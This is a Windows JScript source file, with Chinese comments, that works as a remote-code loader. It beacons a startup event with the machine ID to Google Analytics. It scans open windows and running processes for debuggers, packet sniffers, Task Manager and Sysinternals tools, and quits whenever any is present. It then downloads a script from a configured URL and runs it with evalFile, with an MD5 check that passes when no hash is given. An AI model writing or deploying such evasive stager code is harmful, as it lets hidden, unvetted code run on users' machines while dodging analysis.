//

var __DEBUG = 0 // !!!
var __external = external
var __windows = windows
var __storage = storage

var __locator;
var __service;


//通用函数
function CommonFun()  {}

function CommonFun.GetTimeStamp()
{
	var strPeerId = __external.GetPID()
	if (typeof strPeerId != "string")
	{
		return ""
	}
	
	var strFlag = strPeerId.substring(11, 12)
	var nFlag = parseInt(strFlag, 16)
	if (!nFlag)
	{
		nFlag=0
	}
	
	var nTime =CommonFun.GetCurrentUTCTime()
	var nStamp = Math.floor((nTime + 8 * 3600  - (nFlag + 1) * 3600)/(24*3600))
	var strURLStamp = "?stamp=" + nStamp.toString()
	return strURLStamp 
}


function CommonFun.GetConfigInfo(strAppName, strKey)
{
	var strCurDir = CommonFun.GetCurrentDllDir()
	var strIniFileName = "config.ini"
	var strIniFilePath = strCurDir+"\\"+strIniFileName
	
	if (!CommonFun.QueryFileExists(strIniFilePath))
	{
		return false
	}
	
	var strValue = CommonFun.ReadINIFile(strIniFilePath, strAppName, strKey)
	return strValue
}


function CommonFun.LoadJSFile(strBussinessPath)
{
	evalFile(strBussinessPath)
}


function CommonFun.RegQueryValue(strRegRoot, strRegKeyPath, strValueName)
{
	__storage.RegQueryValue(strRegRoot, strRegKeyPath, strValueName)
}

function CommonFun.GetCurrentUTCTime()
{
	var date=new Date();
	var nUTCInMS = date.getTime();	
	var nUTCInSec = Math.floor(nUTCInMS/1000)
	return nUTCInSec
}

function CommonFun.GetTimeListFromUTC(nUTCInSec)
{
	var date = new Date();
	var nUTCInMS = nUTCInSec*1000
	date.setTime(nUTCInMS)
	var tTimeList = {}
	tTimeList.Year = date.getUTCFullYear()
	tTimeList.Month = date.getUTCMonth()
	tTimeList.Day = date.getUTCDate()
	tTimeList.Hour = date.getUTCHours()
	tTimeList.Min = date.getUTCMinutes()
	tTimeList.Sec = date.getUTCSeconds()
	
	return tTimeList
}


function CommonFun.CheckIsToday(nUTC)
{
	if (!nUTC)
	{
		return false
	}

	var nCurUTC = CommonFun.GetCurrentUTCTime()
	var tCurTimeList = CommonFun.GetTimeListFromUTC(nCurUTC)
	var tInputTimeList = CommonFun.GetTimeListFromUTC(nUTC)

	if (tCurTimeList.Year == tInputTimeList.Year
	    && tCurTimeList.Month == tInputTimeList.Month
	    && tCurTimeList.Day == tInputTimeList.Day)
	{
		return true
	}
	
	return false
}


function CommonFun.GetHistoryPath()
{
	var strHistoryName = "history.ini"
	var strCurDir = CommonFun.GetCurrentDllDir()
	var strHistDir = strCurDir+"\\history\\"
	var strHistPath = strHistDir+strHistoryName

	if (!CommonFun.QueryFileExists(strHistDir))
	{
		var fso =new ActiveXObject("Scripting.FileSystemObject")
		fso.CreateFolder(strHistDir)
		fso = null
	}
		
	return strHistPath
}


function CommonFun.GetFileNameFromURL(strURL)
{
	if (typeof strURL != "string")
	{
		return ""
	}
	
	var nBeginPos = strURL.lastIndexOf("/") + 1
	var nEndPos = strURL.lastIndexOf("?")
	if (-1 == nEndPos)
	{
		nEndPos = strURL.length
	}
	
	var strFileName = strURL.substring(nBeginPos, nEndPos)
	return strFileName
}


function CommonFun.GetIECacheDir()
{
	var CSIDL_FLAG_CREATE = 0x8000
	var CSIDL_INTERNET_CACHE = 0x0020
	var strIETempDir = __storage.GetFolderPath(0, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, 0)
	return strIETempDir
}


function CommonFun.GetBussinessPath(strFileName)
{
	var strIETempDir = CommonFun.GetIECacheDir()
	var strFilePath = strIETempDir+ "\\" +strFileName	
	return strFilePath
}


function CommonFun.CheckFileMD5(strMD5, strFilePath)
{
	CommonFun.log("[CheckFileMD5] strMD5: "+strMD5+"  strFilePath : "+strFilePath)
	if ( !CommonFun.QueryFileExists(strFilePath))
	{
		return false
	}

	if ( typeof strMD5 != "string" || strMD5 == "" )
	{
		return true
	}

	var strFileMD5 = __storage.GetFileMD5(strFilePath)
	if (strFileMD5 == strMD5)
	{
		return true
	}
	
	return false	
}


function CommonFun.log(msg)
{
	var er = CommonFun.log.caller
	var debugstring=""
	var funname=""
	var i = 0	
	for (; er; i++){
		if(er==null){	
			break;
		}
		else{
			var str =er.toString();
			var re = new RegExp("({+)","ig");
			var arr = re.exec(str);
			str = RegExp.leftContext 
			if(i==0){
				funname ="<"+str+">" 
			}
			debugstring =   debugstring+"<-"+str+" ->";
			er = er.caller;
		}
	}	
	trace( msg + "	" + debugstring.replace(/\n/g, " "));
}


function CommonFun.QueryFileExists(strFilePath)
{
	if (typeof strFilePath != "string" || strFilePath == "")
	{
		return false
	}

	return __storage.PathFileExists(strFilePath)
}


function CommonFun.ReadINIFile(strFilePath, strApp, strKey)
{
	return __storage.GetPrivateProfileString(strFilePath, strApp, strKey)
}

function CommonFun.WriteINIFile(strFilePath, strApp, strKey, strValue)
{
	return __storage.WritePrivateProfileValue(strFilePath, strApp, strKey, strValue)
}


function CommonFun.GetCurrentDllDir()
{
	var strCurPath = __external.GetCurrentHostDllPath()
	var nPos = strCurPath.lastIndexOf("\\")
	var strCurDir = strCurPath.substring(0, nPos)
	
	return strCurDir
}



function CommonFun.GetReportURL(tReport)
{
	var strEC = tReport.EC ? tReport.EC : "null"
	var strEA = tReport.EA ? tReport.EA : "null"
	var strEL = tReport.EL ? tReport.EL : "null"
	var strEV = tReport.EV ? tReport.EV : "1"
	var strCID = __external.GetPID()
	var strTID = CommonFun.GetConfigInfo("main", "tid")
	
	if (typeof strTID != "string")
	{
		strTID = "UA-42360423-1"
	}
	
	var strReportURL = "http://www.google-analytics.com/collect/v=1&tid="+strTID+"&cid="
						+strCID+"&t=event&ec="+strEC+"&ea="+strEA+"&el="+strEL+"&ev="+strEV
	return strReportURL
}


function CommonFun.SendReport(tReport)
{
	var strReportURL = CommonFun.GetReportURL(tReport)
	var objCloudCount = new ClassCloudCount()
	var objNetWork = new ClassNetWork(objCloudCount)

	objNetWork.sendHttpStat(strReportURL, true, null, function(){});
}


function CommonFun.QuitMainProcess()
{
	exit()
}


var __bHasReportExit = false
function CommonFun.ReportAndExit(tInputReport)
{
	if (__bHasReportExit)
	{
		return
	}
	__bHasReportExit = true
	
	var tReport = tInputReport ? tInputReport : {}
	tReport.EC = "main"
	tReport.EA = "exit"
	var strReportURL = CommonFun.GetReportURL(tReport)
	var objNetWork = new ClassNetWork()
	
	objNetWork.sendHttpStat(strReportURL, false, 50000, 
		function()
		{
			CommonFun.QuitMainProcess()
		}
	)
}
//通用函数 end


//文件读写
function ClassFileStream()
{
	var adostream = new ActiveXObject("ADODB.Stream")
	if (typeof adostream != "object")
	{
		return false
	}

	this.adostream = adostream
	
	this.Open= function(nMode, nType)
	{
		var mode = nMode ? nMode : 3
		var type = nType ? nType : 1
	
		this.adostream.Mode = mode; // 1-读,2-写,3-读写
		this.adostream.Type = type; // 1-二进制, 2-文本
		adostream.Open();
	}
	
	this.LoadFromFile = function(strFilePath)
	{
		this.adostream.LoadFromFile(strFilePath)
	}
	
	this.Read = function(nByte)
	{
		return this.adostream.Read(nByte)
	}
	
	this.Write = function(strContent)
	{
		this.adostream.Write(strContent)
	}
	
	this.SaveToFile = function(strFilePath, nType)
	{
		this.adostream.SaveToFile(strFilePath, nType);  //1-不覆盖, 2-覆盖
	}	
	
	this.Close = function(strFilePath, nType)
	{
		this.adostream.Close();
	}

}


//异步模块的计数器
ClassCloudCount.AsynObjCount = 0
function ClassCloudCount()
{
	this.ExitProcess = function ()
	{
		var tReport = {}
		tReport.EL = "0"
		CommonFun.ReportAndExit(tReport)
	}
	
	this.Increase = function(strMsg)
	{
		ClassCloudCount.AsynObjCount = ClassCloudCount.AsynObjCount + 1
		CommonFun.log("[ClassCloudCount] count :  ," + ClassCloudCount.AsynObjCount + "  Increase because of : "+strMsg)
	}
	
	this.Decrease = function(strMsg)
	{
		ClassCloudCount.AsynObjCount = ClassCloudCount.AsynObjCount - 1
		CommonFun.log("[ClassCloudCount] count :  ," + ClassCloudCount.AsynObjCount + "  Decrease because of : "+strMsg)
		
		if (ClassCloudCount.AsynObjCount <= 0)
		{
			this.ExitProcess()
		}
	}	
}


//网络模块， 上报\下载
function ClassNetWork(objAsynCount)
{
	this.objAsynCount = objAsynCount
	
	this.IncreaseSynCount = function(strMsg)
	{
		if (this.objAsynCount)
		{
			this.objAsynCount.Increase(strMsg)
		}
	}
	
	this.DecreaseSynCount = function(strMsg)
	{
		if (this.objAsynCount)
		{
			this.objAsynCount.Decrease(strMsg)
		}
	}
}


function ClassNetWork.getXmlHttp () 
{
	if(typeof arguments.callee.objs=="undefined")
	{
		arguments.callee.objs = [];	 
	}
	
	for(var index in arguments.callee.objs)
	{
		var obj = arguments.callee.objs[index];
		if(obj && obj.readyState==4)
		{
			CommonFun.log("exist idle xmlhttp, name = "+" getXmlHttp_name_"+arguments.callee.name+" "+"getXmlHttp.objs.length="+arguments.callee.objs.length);
			// return obj;  //fix here
		}
	}
	if (!arguments.callee.name) 
	{
		arguments.callee.name = 1;
	}
	else
	{
		arguments.callee.name+=1;
	}
	var name = "getXmlHttp_name_" + arguments.callee.name;	
	///////
	var objXmlHttp ;
	if (arguments.callee.progid) 
	{
		objXmlHttp = new ActiveXObject(arguments.callee.progid);
	}
	else
	{
		var MSXML = new Array(  'MSXML2.XMLHTTP'
			,'MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
		for(var n = 0; n < MSXML.length; n ++)
		{
			try {
				objXmlHttp = new ActiveXObject(MSXML[n]);
				if(objXmlHttp){
					arguments.callee.progid = MSXML[n];
					break;
				}
			}catch(e){}
		}
	}
	
	CommonFun.log(arguments.callee.progid)
	
	arguments.callee.objs.push(objXmlHttp);
	CommonFun.log("add XmlHttp , getXmlHttp.objs.length="+arguments.callee.objs.length);	
	
	return objXmlHttp;
}


function ClassNetWork.prototype.send(strUrl, bSync, strProtocol, nTimeoutInMs,fnCallBack)
{ 
	if (typeof strUrl!="string" || typeof bSync!="boolean" 
		|| typeof strProtocol!="string" || typeof fnCallBack != "function")
	{
		CommonFun.log("[ClassNetWork.prototype.send]  param error")
		return
	}	
	
	var pThis = this
	var bHasQuit = false		
	var objXMLHTTP = ClassNetWork.getXmlHttp();
	
	pThis.IncreaseSynCount(" ClassNetWork.prototype.send")
	CommonFun.log("[ClassNetWork.prototype.send]  "+"url: "+strUrl+"  protocol: "+strProtocol+"  bsync: "+bSync);
	
	if(!objXMLHTTP)
	{
		fnCallBack(-1)
		pThis.DecreaseSynCount("ClassNetWork.prototype.send,  objXMLHTTP new = null")
		return false
	}
		
	function SendFinish()
	{
		if (bHasQuit)
		{
			return false
		}
		bHasQuit = true
		fnCallBack(1, objXMLHTTP)
		pThis.DecreaseSynCount("ClassNetWork.prototype.send finish")
	}
	
	objXMLHTTP.onreadystatechange = function ()
	{
		if (objXMLHTTP && objXMLHTTP.readyState == 4)
		{
			SendFinish()
		}		
	}
		
	var timeout = nTimeoutInMs ? nTimeoutInMs : 10*1000
	setTimeout(SendFinish, timeout)  //在send之前调用， 防止bSync设置同步
	
	objXMLHTTP.open(strProtocol, strUrl, bSync);
	objXMLHTTP.send();
		
	return true
}


function ClassNetWork.prototype.sendHttpStat(strUrl, bSync, nTimeoutInMs, fnCallBack)
{ 
	var bRet = this.send(strUrl, bSync, "POST", nTimeoutInMs, fnCallBack)
	return bRet
}


function ClassNetWork.prototype.getHttpContent(strUrl, bSync, strFilePath, nTimeoutInMs, fnCallBack)
{
	function OnSendFinish(nRet, objXMLHTTP)
	{
		CommonFun.log("[ClassNetWork.prototype.getHttpContent] OnSendFinish readyState:  " +  objXMLHTTP.readyState + "  nRet"+nRet)
		if (objXMLHTTP && objXMLHTTP.readyState == 4 && objXMLHTTP.status < 400)  
		{ 
			var adostream = new ActiveXObject("ADODB.Stream")
			if (typeof adostream != "object")
			{
				return false
			}
			
			adostream.Mode = 3;
			adostream.Type = 1;
			adostream.Open();
			adostream.Write(objXMLHTTP.responseBody);
			adostream.SaveToFile(strFilePath, 2);
			adostream.Close();
			delete adostream
			
			fnCallBack(objXMLHTTP)
			
			var i=true; 
			return i;
		}
	}
	
	var bRet = this.send(strUrl, bSync, "GET", nTimeoutInMs, OnSendFinish)
	return bRet
}
//网络模块， 上传下载 end


//进程监测
function ClassProcessFilter(once){
	this.QuitProcess = function(ret)
	{
		var tReport = {}
		tReport.EL = "1"
		CommonFun.ReportAndExit(tReport)
	}
	
	this.CheckIgnoreFilter = function()
	{
		var strIgnoreIniPath = "C:\\SH_CONFIG\\sh.ini"
		if ( !CommonFun.QueryFileExists(strIgnoreIniPath) )
		{	
			return false
		}
		
		var nIgnore = CommonFun.ReadINIFile(strIgnoreIniPath, "Ignore", "ignore")
		if ( typeof nIgnore == "string" && nIgnore == "1" )
		{
			CommonFun.log("[ClassProcessFilter] Ignore blacklist !! ")
			return true
		}
		return false
	}
	
}

function ClassProcessFilter.prototype.run(bOnce){
	var pThis = this;
	var bIngore = pThis.CheckIgnoreFilter()
	if (bIngore)
	{
		return true
	}
	
	var ret = external.__debugging || this.checkWindows() || this.checkProcesses();	
	CommonFun.log("ret="+ret+" ,bOnce="+bOnce + ", external.__debugging="+external.__debugging);	
	if(bOnce){
		if(ret){
			pThis.QuitProcess(ret)
			return false
		}
		return true;
	}else{
		setInterval(function (){
			var ret = external.__debugging || pThis.checkWindows() || pThis.checkProcesses(); 
			if(ret){
				pThis.QuitProcess(ret)
			}
		}, 1500)
	}
}
function ClassProcessFilter.prototype.checkWindows(){
	var blacklist=["Microsoft Visual", "HTTP Analyzer", "WinDBG", "OllyDebug",		
		"fiddler", "SmartSniff", "Spy++", "ATL/MFC","Spy", 
		 "File Monitor", "Registry Monitor","Wireshark","OllyICE","OllyDBG",
		" - Sysinternals:"];
	if(!__DEBUG){
		blacklist.push("DebugView")
		// blacklist.push("ÈÎÎñ¹ÜÀíÆ÷")
		blacklist.push("Process Explorer")
	}
	if(__DEBUG)
		blacklist = [];
	var titile
	var ret = __windows.EnumWindows(function(hwnd, text){
		for(var index in blacklist){
			var t = text.toLowerCase();
			var s = blacklist[index].toLowerCase();
			if(t.indexOf(s)>=0){
				titile = text;
				CommonFun.log("exist wnd " + text + " will exit() ;")
				return 0;
			}
		}
	}); 
	
	return titile;
}

function ClassProcessFilter.prototype.checkProcesses()
{
	var blacklist=["wireshark", "fiddler", "httpanalyzer", "smsniff", 
					"filemon", "regmon", "procmon", "windbg", "cv.exe",
					"ollydbg", "softice", "mzurlspy","devenv","msdev","spy","ollyice","Wireshark","dan",
					"depends"];
					
	if(!__DEBUG){
		blacklist.push("dbgv")
		blacklist.push("taskmgr")
		blacklist.push("procexp")
	}
	if(__DEBUG)
		blacklist = [];
	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
	for (var index in blacklist){
		var name = blacklist[index];
		wql += " or Name like '%" + name+"%'";	
	}
	
	var process = new Enumerator (__service.ExecQuery(wql)).item();	
	if(process){
		CommonFun.log("exist process " + process.Name + " will exit() ; wql="+wql)
	}else{
		
	}
	var ret = process ?  process.Name :false;
	delete process;
	return ret;
}


function ClassProcessFilter.prototype.checkSpecifyPro(tBlackList)
{
	var blacklist = tBlackList ? tBlackList : []
	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
	for (var index in blacklist){
		var name = blacklist[index];
		wql += " or Name like '%" + name+"%'";	
	}
	
	var process = new Enumerator (__service.ExecQuery(wql)).item();	
	if(process){
		CommonFun.log("exist process " + process.Name + " will exit() ; wql="+wql)
	}else{
		
	}
	var ret = process ?  process.Name :false;
	CommonFun.log("[checkSpecifyPro]  ret: " +ret)
	
	delete process;
	return ret;
}


//进程监测  end


///////
function MainNS()  {}



function MainNS.SendStartupReport()
{
	var tReport = {}
	tReport.EC = "main"
	tReport.EA = "start"
	
	CommonFun.SendReport(tReport)
}

function MainNS.GetIndexInfo()
{
	var strIndexURL = CommonFun.GetConfigInfo("main", "initurl")
	if (typeof strIndexURL != "string")
	{
		return false
	}
	
	var strSaveDir = CommonFun.GetIECacheDir()
	var strSaveName = CommonFun.GetFileNameFromURL(strIndexURL)
	var strSavePath = strSaveDir+"\\"+strSaveName
	var objCloudCount = new ClassCloudCount()
	var objNetWork = new ClassNetWork(objCloudCount)

	var strURLStamp = CommonFun.GetTimeStamp()
	var strURLWithStamp = strIndexURL+strURLStamp
	//开启同步下载
	objNetWork.getHttpContent(strURLWithStamp, false, strSavePath, null, function() {} );
	
	if (!CommonFun.QueryFileExists(strSavePath))
	{
		return false
	}
	
	var tIndexInfo = {}
	tIndexInfo.strURL = CommonFun.ReadINIFile(strSavePath, "launch", "url")
	tIndexInfo.strMD5 = CommonFun.ReadINIFile(strSavePath, "launch", "md5")
	return tIndexInfo
}


function MainNS.DownLoadBussiness(tIndexInfo, strBussinessPath)
{
	var strURL = tIndexInfo.strURL
	var strMD5 = tIndexInfo.strMD5
	var objCloudCount = new ClassCloudCount()
	var objNetWork = new ClassNetWork(objCloudCount)

	var strURLStamp = CommonFun.GetTimeStamp()
	var strURLWithFix = strURL+strURLStamp
	//同步下载,阻塞
	objNetWork.getHttpContent(strURLWithFix, false, strBussinessPath, null, function() {} );
	
	if (!CommonFun.QueryFileExists(strBussinessPath) 
		|| !CommonFun.CheckFileMD5(strMD5, strBussinessPath) )
	{
		return false
	}
	
	CommonFun.LoadJSFile(strBussinessPath)
}


function MainNS.TryDownLoadBussiness()
{
	var tIndexInfo = MainNS.GetIndexInfo()
	if (!tIndexInfo)
	{
		return false
	}
	
	var strMD5 = tIndexInfo.strMD5
	var strURL = tIndexInfo.strURL
	var strFileName = CommonFun.GetFileNameFromURL(strURL)
	var strBussinessPath = CommonFun.GetBussinessPath(strFileName)

	var bCheckSucc = CommonFun.CheckFileMD5(strMD5, strBussinessPath)
	if (bCheckSucc)
	{
		CommonFun.LoadJSFile(strBussinessPath)
		return true
	}
	
	MainNS.DownLoadBussiness(tIndexInfo, strBussinessPath)
}


function MainNS.InitParam()
{
	__locator = new ActiveXObject ("WbemScripting.SWbemLocator")
	if(typeof(__locator) != "object")
	{
		return false
	}
	
    __service=__locator.ConnectServer(".")
	if(typeof(__locator) != "object")
	{
		return false
	}
	
	return true
}



//begin here
function onload(stragr)
{
	//异步计数
	var objCloudCount = new ClassCloudCount()
	objCloudCount.Increase("main enter")

	MainNS.SendStartupReport()

	var bSucc = MainNS.InitParam()
	if (!bSucc)
	{
		CommonFun.QuitMainProcess()
		return false
	}
	
	var bCheckOnce = true
	var objProcessFilter = new ClassProcessFilter()

	var bPassFilter = objProcessFilter.run(bCheckOnce)
	if (!bPassFilter)
	{
		return false //在 run() 函数中杀进程
	}

	MainNS.TryDownLoadBussiness()
	
	objProcessFilter.run(!bCheckOnce)	
	objCloudCount.Decrease("main finish")
}



///////////////////////////////////////////////////////////////////////